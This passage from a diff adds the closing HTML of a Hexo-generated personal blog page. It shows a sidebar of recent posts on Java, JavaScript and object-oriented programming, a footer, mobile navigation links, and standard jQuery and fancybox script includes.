+            <a href="/2023/07/03/Java%20Learning%20Record/">Java Learning Record</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/02/Javascript%20Learning%20Record/">Javascript Learning Record</a>
+          </li>
+        
+          <li>
+            <a href="/2023/06/18/Advanced%20object-oriented%20programming/">Advanced object-oriented programming</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+    <div class="widget-wrap toc">
+  <h3 class="widget-title">Catalog</h3>
+  <div class="widget"></div>
+</div>
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 Lunatic<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/about" class="mobile-nav-link">About</a>
+  
+    <a href="/Friends" class="mobile-nav-link">Friends</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+<!-- Toc -->
+
+<script src="/js/toc.js"></script>
+
+<!-- Toc -->
+  </div>
+</body>
+</html>
